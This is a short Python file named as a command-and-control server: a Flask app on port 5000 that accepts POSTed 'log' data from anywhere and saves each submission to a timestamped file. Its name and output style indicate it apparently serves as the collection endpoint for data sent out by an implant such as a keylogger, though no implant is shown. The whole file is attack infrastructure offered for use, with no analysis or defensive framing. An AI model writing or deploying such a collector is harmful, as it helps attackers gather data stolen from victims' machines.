# c2_server/server.py

from flask import Flask, request
import os
from datetime import datetime

app = Flask(__name__)
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

@app.route("/log", methods=["POST"])
def receive_log():
	data = request.form.get("log", "")
	timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
	filename = f"{LOG_DIR}/log_{timestamp}.txt"

	with open(filename, "w") as f:
		f.write(data)

	print(f"[+] Received log at {timestamp}")
	return "OK", 200

if __name__ == "__main__":
	app.run(host="0.0.0.0", port=5000)
